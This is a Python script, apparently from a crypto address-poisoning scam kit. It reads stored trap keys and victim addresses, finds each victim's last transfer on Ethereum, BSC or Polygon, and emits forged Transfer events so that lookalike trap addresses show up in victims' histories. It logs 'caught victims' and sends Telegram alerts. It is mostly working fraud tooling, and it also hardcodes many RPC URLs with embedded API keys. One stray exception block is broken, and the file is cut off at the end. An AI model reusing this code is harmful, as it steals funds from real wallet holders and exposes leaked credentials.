#!/usr/bin/env python3
import sys
import os
import re
import time
import argparse
import json
import urllib.request
from datetime import datetime, timezone
from web3 import Web3
from dotenv import load_dotenv
from web3.exceptions import TimeExhausted

# --- Ensure we don't let .env overwrite OS-level PM2 variables ---
load_dotenv(override=False)

# --- Gas Reserve Configuration ---
# Amount in USD to keep as a reserve in the trap wallet for future gas fees
GAS_RESERVE_USD = float(os.getenv("GAS_RESERVE_USD", "0.20"))

# --- Official POA middleware import ---
try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import poa
        geth_poa_middleware = poa
    except ImportError:
        try:
            from web3.middleware import geth_poa
            geth_poa_middleware = geth_poa
        except ImportError:
            geth_poa_middleware = None
            print('[DEBUG] POA middleware not found; BSC/Polygon may have extraData errors.')

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.config import config
from lib.logger import logger
from lib.notifier import send_telegram
from lib.shutdown import setup_graceful_shutdown
from lib.encryption import decrypt

# --- Supabase client for job tracking ---
try:
    from supabase import create_client
except ImportError:
    create_client = None

SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
supabase = None
if SUPABASE_URL and SUPABASE_KEY and create_client:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# ─── Read preferred asset from environment (set by re_poison.js) ───
PREFERRED_ASSET = os.getenv("DUST_ASSET")
if PREFERRED_ASSET:
    print(f'[DEBUG] PREFERRED_ASSET from env: {PREFERRED_ASSET}')
else:
    print('[DEBUG] No PREFERRED_ASSET set, will use default fallback')

def update_job(job_id, status=None, progress=None, total=None, message=None):
    """Update job status in Supabase with proper ISO timestamps."""
    if not supabase or not job_id:
        return
    data = {}
    if status is not None:
        data["status"] = status
    if progress is not None:
        data["progress"] = progress
    if total is not None:
        data["total"] = total
    if message is not None:
        data["message"] = message
        
    iso_now = datetime.now(timezone.utc).isoformat()
    if status == "running" and "started_at" not in data:
        data["started_at"] = iso_now
    if status in ("completed", "failed"):
        data["completed_at"] = iso_now

    if not data:
        return

    try:
        supabase.table("jobs").update(data).eq("id", job_id).execute()
    except Exception as e:
        logger.error(f"Failed to update job {job_id}: {e}")

def get_campaign_id_from_job(job_id):
    """Retrieve campaign_id from job record."""
    if not supabase:
        return None
    try:
        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
        if result.data:
            return result.data[0]["campaign_id"]
    except Exception as e:
        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
    return None

print('[DEBUG] Starting duster.py...')

# --- MULTI‑CHAIN: STRICT PM2 Env Var Prioritization ---
CHAIN = os.getenv('CHAIN') or getattr(config, 'CHAIN', 'ethereum')
chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None

if chain_cfg and 'tokens' in chain_cfg:
    TOKEN_CONFIG = chain_cfg['tokens']
else:
    TOKEN_CONFIG = config.TOKEN_CONFIG

if chain_cfg and 'dust' in chain_cfg:
    DUST_AMOUNT = chain_cfg['dust']
else:
    DUST_AMOUNT = config.DUST_AMOUNT

NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'

if hasattr(config, 'get_chain_rpc'):
    RPC_URL = config.get_chain_rpc()
else:
    RPC_URL = config.DUSTER_RPC_URL

if RPC_URL is None or RPC_URL == "":
    RPC_URL = os.getenv("DUSTER_RPC_URL") or os.getenv("NODE_RPC_URL")

print(f'[DEBUG] Chain: {CHAIN}, Native symbol: {NATIVE_SYMBOL}')
print('[DEBUG] DUST_AMOUNT:', DUST_AMOUNT)
print('[DEBUG] TOKEN_CONFIG:', TOKEN_CONFIG)
print(f'[DEBUG] Using RPC: {RPC_URL}')

# --- Custom HTTPProvider that truncates extraData for POA chains ---
class POAHTTPProvider(Web3.HTTPProvider):
    def make_request(self, method, params):
        response = super().make_request(method, params)
        if method in ('eth_getBlockByNumber', 'eth_getBlockByHash'):
            if 'result' in response and 'extraData' in response['result']:
                extra = response['result']['extraData']
                if isinstance(extra, str):
                    extra_bytes = bytes.fromhex(extra[2:] if extra.startswith('0x') else extra)
                else:
                    extra_bytes = extra
                if len(extra_bytes) > 32:
                    response['result']['extraData'] = '0x' + extra_bytes[:32].hex()
        return response

# Handle POA middleware import across different web3.py versions
try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import ExtraDataToPOAMiddleware as geth_poa_middleware
    except ImportError:
        geth_poa_middleware = None


# ─── Public RPC fallbacks (Verified High-Availability Nodes) ───
PUBLIC_RPC_FALLBACKS = {
    'bsc': [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  'polygon': [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  'ethereum': [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth.llamarpc.com',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://1rpc.io/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
}

# ─── Alchemy RPCs for deep history fetching ───
ALCHEMY_RPCS = {
    'bsc': [
        'https://bnb-mainnet.g.alchemy.com/v2/alch_DMA2jJjcrOWJ9R10_Fx5k',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_bBpETSAAmA8VjshNMBkLn',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_VJ0_4LOGnzlbo7NPkqhg-',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
        'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh',
    ],
    'polygon': [
        'https://polygon-mainnet.g.alchemy.com/v2/alch_qfGoxus-szPvLI44z9YWw',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_fcNea90VExKd5DNvSguRa',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_sr3YXfVMNVZJ5qSCU0kyD',
        'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
        'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11',
    ],
    'ethereum': [
        'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
        'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
        'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
        'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
        'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
        'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
        'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
        'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
        'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et',
    ],
}


# ─── Mirror Token Contracts ───
MIRROR_TOKEN_USDC = os.getenv("MIRROR_TOKEN_USDC")
MIRROR_TOKEN_USDT = os.getenv("MIRROR_TOKEN_USDT")
MIRROR_TOKEN_NATIVE = os.getenv("MIRROR_TOKEN_NATIVE")

MIRROR_CONTRACTS = {
    "USDC": MIRROR_TOKEN_USDC,
    "USDT": MIRROR_TOKEN_USDT,
    "ETH": MIRROR_TOKEN_NATIVE,
    "BNB": MIRROR_TOKEN_NATIVE,
    "MATIC": MIRROR_TOKEN_NATIVE,
}

MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')

# Mirror uses the campaign funding wallet as operator (same as re_poison.js)
def get_mirror_operator_key(campaign_id):
    """Fetch and decrypt the funding key for mirror operations."""
    if not supabase or not campaign_id:
        return None
    try:
        result = supabase.table("campaigns").select("funding_private_key_enc").eq("id", campaign_id).execute()
        if not result.data:
            return None
        enc_key = result.data[0].get("funding_private_key_enc")
        if not enc_key:
            return None
        funding_key = decrypt(enc_key).strip()
        if not funding_key.startswith('0x'):
            funding_key = f'0x{funding_key}'
        return funding_key
    except Exception as e:
        logger.error(f"Failed to get mirror operator key: {e}")
        return None

def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaign_id):
    """
    Emit a forged Transfer event via MirrorToken contract.
    Returns tx_hash on success, None on failure.
    """
    contract_address = MIRROR_CONTRACTS.get(asset.upper())
    if not contract_address:
        logger.warning(f"[mirror] No MirrorToken contract configured for {asset}")
        return None

    operator_key = get_mirror_operator_key(campaign_id)
    if not operator_key:
        logger.warning(f"[mirror] No funding key for campaign {campaign_id}, cannot emit mirror")
        return None

    try:
        operator_account = w3.eth.account.from_key(operator_key)
        operator_addr = operator_account.address

        contract = w3.eth.contract(
            address=w3.to_checksum_address(contract_address),
            abi=MIRROR_ABI
        )

        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")

        # Use low gas - mirror only needs ~50k gas
        latest_block = call_with_retry(w3.eth.get_block, "latest")
        use_eip1559 = (
            "baseFeePerGas" in latest_block
            and latest_block["baseFeePerGas"] is not None
            and CHAIN.lower() != "bsc"
        )

        gas_params = {}
        if use_eip1559:
            base_fee = latest_block["baseFeePerGas"]
            if CHAIN.lower() == "polygon":
                max_priority = w3.to_wei(30, "gwei")
            elif CHAIN.lower() == "ethereum":
                max_priority = w3.to_wei(0.05, "gwei")
            else:
                max_priority = w3.to_wei(0.01, "gwei")
            max_fee = int((base_fee * 1.02) + max_priority)
            gas_params['maxFeePerGas'] = max_fee
            gas_params['maxPriorityFeePerGas'] = max_priority
        else:
            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)

        tx = contract.functions.transferFrom(
            w3.to_checksum_address(victim_address),
            w3.to_checksum_address(trap_address),
            raw_value
        ).build_transaction({
            'from': operator_addr,
            'nonce': nonce,
            'gas': 60000,
            'chainId': w3.eth.chain_id,
            **gas_params
        })

        # Check operator has enough native for gas
        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
        gas_cost = 60000 * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
        if operator_balance < gas_cost:
            logger.error(f"[mirror] Operator {operator_addr} has insufficient gas. Need {w3.from_wei(gas_cost, 'ether')}, have {w3.from_wei(operator_balance, 'ether')}")
            return None

        signed = w3.eth.account.sign_transaction(tx, operator_key)
        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        logger.info(f"[mirror] Forged Transfer emitted: {victim_address} → {trap_address} raw={raw_value} {asset} tx={tx_hash.hex()}")

        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
        if receipt.status == 1:
            logger.info(f"[mirror] ✅ Mirror tx confirmed in block {receipt.blockNumber}")
            return tx_hash.hex()
        else:
            logger.error(f"[mirror] ❌ Mirror tx reverted")
            return None

    except Exception as e:
        logger.error(f"[mirror] Failed to emit forged transfer: {e}")
        return None


def get_web3():
    get_var = lambda name: getattr(config, name, None) or os.getenv(name)

    raw_urls = [
        get_var("RPC_URL"),
        get_var("DUSTER_RPC_URL"),
        get_var("NODE_RPC_URL"),
    ] + getattr(config, "FALLBACK_RPC_URLS", []) + PUBLIC_RPC_FALLBACKS.get(CHAIN.lower(), [])

    rpc_urls = list(dict.fromkeys([url for url in raw_urls if url]))

    print(f'[DEBUG] Trying {len(rpc_urls)} RPC URLs...')

    for url in rpc_urls:
        try:
            print(f'[DEBUG] Connecting to {url}...')
            provider = Web3.HTTPProvider(url, request_kwargs={'timeout': 10})
            w3 = Web3(provider)

            if w3.is_connected():
                if CHAIN.lower() in ('bsc', 'polygon') and geth_poa_middleware is not None:
                    try:
                        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
                    except Exception as e:
                        print(f'[DEBUG] POA middleware injection skipped/failed: {e}')

                logger.info(f"Connected to RPC: {url}")
                return w3
        except Exception as e:
            print(f'[DEBUG] Connection failed for {url}: {e}')
            continue

    logger.critical("No RPC connection available.")
    sys.exit(1)

w3 = get_web3()
print('[DEBUG] Web3 instance ready.')

VAULT_FILE = config.VAULT_FILE

ERC20_ABI = [
    {
        "constant": False,
        "inputs": [{"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function",
    },
    {
        "constant": True,
        "inputs": [{"name": "owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function",
    },
]

def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            last_exc = e
            err_str = str(e).lower()
            if attempt < max_attempts:
                delay = base_delay * (2 ** (attempt - 1))
                if "429" in err_str or "too many requests" in err_str or "limit" in err_str:
                    delay = max(delay, 5)
                logger.warning(f"Retry {attempt}/{max_attempts} for {func.__name__} after {delay}s: {e}")
                time.sleep(delay)
            else:
                raise
    raise last_exc



def get_native_reserve_wei(chain_name):
    """Calculates the Wei equivalent of the GAS_RESERVE_USD for the native coin."""
    try:
        # CoinGecko IDs for the 3 supported chains
        symbol_map = {"ethereum": "ethereum", "bsc": "binancecoin", "polygon": "matic-network"}
        coin_id = symbol_map.get(chain_name.lower(), "ethereum")
        
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd"
        req = urllib.request.Request(url, headers={'User-Agent': 'CipherNet/1.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            price = data[coin_id]['usd']
            
            # Calculate exact Wei needed for the USD reserve (all 3 chains use 18 decimals)
            reserve_native = GAS_RESERVE_USD / price
            return int(reserve_native * (10 ** 18))
            
    except Exception:
        # Safe fallback reserves using conservative worst-case prices 
        # to ensure the trap ALWAYS keeps at least the GAS_RESERVE_USD value
        worst_case_prices = {
            "ethereum": 4000,   # Assumes ETH <= $4000
            "bsc": 700,         # Assumes BNB <= $700
            "polygon": 1.0      # Assumes MATIC <= $1.00
        }
        price = worst_case_prices.get(chain_name.lower(), 4000)
        return int((GAS_RESERVE_USD / price) * (10 ** 18))

          
    except Exception as e:
        err_str = str(e)
        
        # Clean up raw RPC dictionary errors
        if "'message':" in err_str:
            import re
            match = re.search(r"'message':\s*'([^']+)'", err_str)
            if match:
                err_str = match.group(1)
                
        logger.error(f"Error: {err_str}")
        send_telegram(
            f"❌ Poison failed\n\n"
            f"Victim: {victim_address}\n\n"
            f"⚠️ Error: {err_str}", 
            campaign_id=campaign_id
        )
        return False

def read_vault_lines(file_path):
    lines = []
    if not os.path.exists(file_path):
        return lines
    with open(file_path, 'r') as f:
        raw_lines = f.readlines()
        for idx, raw_line in enumerate(raw_lines):
            line = raw_line.strip()
            if not line:
                continue
            try:
                decrypted = decrypt(line)
                lines.append(decrypted)
            except Exception as e:
                logger.error(f"Failed to decrypt line {idx+1}: {e}")
                continue
    return lines

def get_trap_entries_from_db(campaign_id):
    entries = []
    if not supabase:
        logger.error("Supabase client not initialized.")
        return entries
    try:
        result = supabase.table("traps")\
            .select("victim_address, trap_private_key_enc")\
            .eq("campaign_id", campaign_id)\
            .execute()
        if not result.data:
            logger.info(f"No traps found for campaign {campaign_id}")
            return entries
        for row in result.data:
            enc_key = row.get("trap_private_key_enc")
            if not enc_key:
                continue
            try:
                private_key = decrypt(enc_key)
                w3.eth.account.from_key(private_key)
                victim = row.get("victim_address", "").lower()
                if victim:
                    entries.append((victim, private_key))
            except Exception as e:
                logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
                continue
        logger.info(f"Loaded {len(entries)} trap entries from database for campaign {campaign_id}")
    except Exception as e:
        logger.error(f"Failed to fetch traps from database: {e}")
    return entries


def get_counterparty_from_db(victim_address, campaign_id):
    """Fetch the counterparty address for a specific victim from the traps table."""
    if not supabase:
        logger.error("Supabase client not initialized.")
        return None
    try:
        result = supabase.table("traps")\
            .select("counterparty_address")\
            .eq("campaign_id", campaign_id)\
            .eq("victim_address", victim_address.lower())\
            .single()\
            .execute()
        if result.data:
            return result.data.get("counterparty_address")
        return None
    except Exception as e:
        logger.error(f"Failed to fetch counterparty for victim {victim_address}: {e}")
        return None

def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
    """
    Fetch the most recent transfer from victim to counterparty.
    
    Strategy:
    1. Try explicit Alchemy RPCs using alchemy_getAssetTransfers (searches ENTIRE history instantly).
    2. Fall back to global w3 (Free RPCs) using chunked eth_getLogs (safe 10k block chunks).
    
    Returns (asset_symbol, amount_in_smallest_units) or (None, None).
    """
    try:
        victim_checksum = w3.to_checksum_address(victim_address)
        counterparty_checksum = w3.to_checksum_address(counterparty_address)
        victim_lower = victim_address.lower()
        counterparty_lower = counterparty_address.lower()
        
        # ═══════════════════════════════════════════════════════
        # METHOD 1: Explicit Alchemy RPCs (Instant Full History)
        # ═══════════════════════════════════════════════════════
        alchemy_urls = ALCHEMY_RPCS.get(CHAIN.lower(), [])
        
        for url in alchemy_urls:
            try:
                # Create a temporary Web3 instance for this specific Alchemy URL
                alchemy_w3 = Web3(Web3.HTTPProvider(url, request_kwargs={'timeout': 10}))
                if not alchemy_w3.is_connected():
                    continue

                categories = ['external', 'erc20']
                if CHAIN.lower() in ('ethereum', 'polygon'):
                    categories.append('internal')
                
                result = alchemy_w3.provider.make_request('alchemy_getAssetTransfers', [{
                    'fromBlock': '0x0',
                    'toBlock': 'latest',
                    'fromAddress': victim_checksum,
                    'toAddress': counterparty_checksum,
                    'category': categories,
                    'order': 'desc',
                    'maxCount': '0x5',
                    'withMetadata': False,
                }])
                
                if 'result' in result and result['result'].get('transfers'):
                    transfers = result['result']['transfers']
                    
                    for t in transfers:
                        if (t.get('from', '').lower() == victim_lower and 
                            t.get('to', '').lower() == counterparty_lower):
                            
                            # Native transfer
                            if t.get('category') == 'external':
                                value_hex = t.get('value', '0x0')
                                value_wei = int(value_hex, 16) if isinstance(value_hex, str) else int(value_hex)
                                if value_wei > 0:
                                    logger.info(f"[Alchemy:{url[:30]}...] Found {NATIVE_SYMBOL} transfer: {w3.from_wei(value_wei, 'ether')}")
                                    return (NATIVE_SYMBOL, value_wei)
                            
                            # ERC-20 transfer
                            elif t.get('category') == 'erc20':
                                # Alchemy returns exact raw hex in rawContract.value to avoid float precision loss
                                raw_contract = t.get('rawContract', {})
                                raw_hex = raw_contract.get('value')
                                
                                if raw_hex:
                                    value_units = int(raw_hex, 16)
                                else:
                                    # Fallback if rawContract is missing (multiply float by decimals)
                                    token_addr = raw_contract.get('address', '').lower()
                                    decimals = 6 # default
                                    for sym, addr in TOKEN_CONFIG.items():
                                        if addr.lower() == token_addr:
                                            decimals = config.get_token_decimals().get(sym, 6) if hasattr(config, 'get_token_decimals') else 6
                                            break
                                    value_units = int(float(t.get('value', 0)) * (10 ** decimals))
                                
                                if value_units > 0:
                                    token_contract = raw_contract.get('address', '').lower()
                                    for symbol, addr in TOKEN_CONFIG.items():
                                        if addr.lower() == token_contract:
                                            logger.info(f"[Alchemy:{url[:30]}...] Found {symbol} transfer: {value_units} units")
                                            return (symbol, value_units)
                                            
                # If we got here, Alchemy worked but didn't find the transfer in the last 5
                # We can break the loop because Alchemy searched the whole history
                logger.info(f"[Alchemy] Searched entire history via {url[:30]}..., no match found.")
                break 
                
            except Exception as e:
                logger.debug(f"[Alchemy] Failed on {url[:30]}...: {e}")
                continue
        
        # ═══════════════════════════════════════════════════════
        # METHOD 2: Fallback to Free RPCs (Chunked eth_getLogs)
        # Free RPCs limit log queries, so we use safe 10,000 block chunks
        # ═══════════════════════════════════════════════════════
        current_block = call_with_retry(w3.eth.get_block_number)
        chunk_size = 10000  # Safe limit for free RPCs (Ankr/PublicNode)
        max_search_blocks = 2000000 
        
        logger.info(f"[Fallback] Using free RPC. Searching backwards from block {current_block} in {chunk_size}-block chunks...")
        
        transfer_topic = w3.keccak(text="Transfer(address,address,uint256)").hex()
        victim_topic = '0x' + victim_lower[2:].zfill(64)
        counterparty_topic = '0x' + counterparty_lower[2:].zfill(64)
        
        search_block = current_block
        blocks_searched = 0
        
        while blocks_searched < max_search_blocks and search_block > 0:
            from_block = max(0, search_block - chunk_size + 1)
            
            try:
                for token_symbol, token_address in TOKEN_CONFIG.items():
                    try:
                        logs = w3.eth.get_logs({
                            'fromBlock': from_block,
                            'toBlock': search_block,
                            'address': w3.to_checksum_address(token_address),
                            'topics': [transfer_topic, victim_topic, counterparty_topic],
                        })
                        
                        if logs:
                            latest_log = logs[-1]
                            value = int(latest_log['data'], 16)
                            if value > 0:
                                logger.info(f"[Fallback] Found {token_symbol} transfer at block {latest_log['blockNumber']}: {value} units")
                                return (token_symbol, value)
                    except Exception:
                        continue
                        
            except Exception as e:
                logger.debug(f"[Fallback] Error scanning blocks {from_block}-{search_block}: {e}")
            
            blocks_searched += chunk_size
            search_block = from_block - 1
            
            if blocks_searched % 100000 == 0:
                logger.info(f"[Fallback] Searched {blocks_searched} blocks so far...")
        
        logger.warning(f"[Fallback] No victim→counterparty transfers found after searching {blocks_searched} blocks")
        return (None, None)
        
    except Exception as e:
        logger.error(f"[RPC] Error fetching last transfer: {e}")
        return (None, None)


def batch_poison(job_id=None, campaign_id=None):
    if campaign_id:
        logger.info(f"Using database for campaign {campaign_id}")
        entries = get_trap_entries_from_db(campaign_id)
        if not entries:
            logger.error(f"No traps found for campaign {campaign_id}")
            return
    else:
        logger.info("Using vault file for legacy mode")
        if not os.path.exists(VAULT_FILE):
            logger.error(f"{VAULT_FILE} not found.")
            return
        decrypted_lines = read_vault_lines(VAULT_FILE)
        if not decrypted_lines:
            logger.error("No valid (decrypted) entries found in vault.txt")
            return
        entries = []
        for line in decrypted_lines:
            match = re.search(r"Victim:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
            if match:
                entries.append((match.group(1), match.group(2)))
            else:
                match = re.search(r"Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
                if match:
                    entries.append((match.group(1), match.group(2)))

    if not entries:
        logger.error("No valid entries found")
        return

    CAUGHT_FILE = config.CAUGHT_FILE
    caught = set()
    if os.path.exists(CAUGHT_FILE):
        try:
            with open(CAUGHT_FILE, 'r') as f:
                data = f.read()
                if data.strip():
                    for line in data.split('\n'):
                        addr = line.strip().lower()
                        if addr:
                            caught.add(addr)
            logger.info(f"Loaded {len(caught)} caught victims from {CAUGHT_FILE}")
        except Exception as e:
            logger.warning(f"Could not read caught victims file: {e}")

    total = len(entries)
    logger.info(f"Found {total} victims. Processing with mirror events only...")
    if job_id:
        update_job(job_id, total=total)

    success = 0
    for i, (victim, key) in enumerate(entries, 1):
        if victim.lower() in caught:
            logger.info(f"Skipping caught victim {victim}")
            continue

        logger.info(f"[{i}/{total}] Processing victim {victim}")
        
        trap_address = w3.eth.account.from_key(key).address.lower()
        
        # Fetch counterparty from DB
        counterparty = get_counterparty_from_db(victim, campaign_id)
        if not counterparty:
            logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
            continue
        
        # Fetch last transfer from blockchain
        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty}...")
        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty)
        
        if not fetched_asset or not fetched_amount:
            logger.warning(f"[{i}/{total}] No transfer found for {victim}, skipping")
            continue
        
        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
        
        
        # Emit FAKE mirror event (no real tokens needed)
        tx_hash = emit_mirror_transfer(victim, trap_address, fetched_amount, fetched_asset, campaign_id)
        
        if tx_hash:
            success += 1
            logger.info(f"[{i}/{total}] ✅ Mirror event emitted: {tx_hash}")
            
            # 🆕 Send individual Telegram notification for each successful mirror
            try:
                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
                if hasattr(config, 'get_token_decimals'):
                    decimals = config.get_token_decimals().get(fetched_asset, decimals)
            except AttributeError:
                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
            
            amount_display = fetched_amount / (10 ** decimals)
            success_msg = (
                f"✅ Poison sent successfully!\n"
                f"Victim: {victim}\n"
                f"Trap: {trap_address}\n"
                f"Amount: {amount_display:.6f} {fetched_asset}\n"
                f"TX: {tx_hash}"
            )
            send_telegram(success_msg, campaign_id=campaign_id)
        else:
            logger.error(f"[{i}/{total}] ❌ Mirror emission failed")
            
        if job_id and i % 5 == 0:
            update_job(job_id, progress=i)
        time.sleep(1)

    logger.info(f"Completed: {success}/{total} successful.")
    send_telegram(f"🏁 Mirror batch complete: {success}/{total} successful.", campaign_id=campaign_id)

    if job_id:
        if success == total:
            update_job(job_id, status='completed', progress=total, message='All done')
        else:
            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded')

if __name__ == "__main__":
    setup_graceful_shutdown()

    parser = argparse.ArgumentParser()
    parser.add_argument('--job-id', help='Job ID for tracking')
    parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
    parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
    args = parser.parse_args()
    
    job_id = args.job_id
    campaign_id = None
    if job_id:
        update_job(job_id, status='running')
        campaign_id = get_campaign_id_from_job(job_id)
    else:
        campaign_id = os.getenv('CAMPAIGN_ID')

    if args.private_key and args.victim_address:
        trap_address = w3.eth.account.from_key(args.private_key).address.lower()

        # STEP 1: Fetch last transfer from blockchain
        counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
        if not counterparty:
